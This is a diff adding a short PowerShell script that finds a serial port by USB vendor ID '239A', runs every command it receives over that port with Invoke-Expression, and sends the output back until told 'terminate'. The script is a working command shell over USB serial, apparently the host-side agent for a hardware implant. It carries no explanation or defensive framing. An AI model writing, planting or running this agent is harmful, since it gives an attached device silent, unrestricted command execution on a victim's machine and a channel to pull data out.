@@ -1,0 +1,14 @@
+$comm = (Get-WMIObject Win32_SerialPort | Select-Object DeviceID,PNPDeviceID | Where-Object {$_.PNPDeviceID -like "*239A*"}).DeviceID |select -last 1
+$port= new-Object System.IO.Ports.SerialPort $comm,115200,None,8,one
+$port.open()
+while ($true) {
+    if ($port.BytesToRead -gt 0) {
+        $cmd = $port.ReadExisting()
+        if ($cmd -eq 'terminate') {
+            $port.close()
+            break
+        }
+        $output = iex $cmd
+        $port.write($output)
+    }
+}
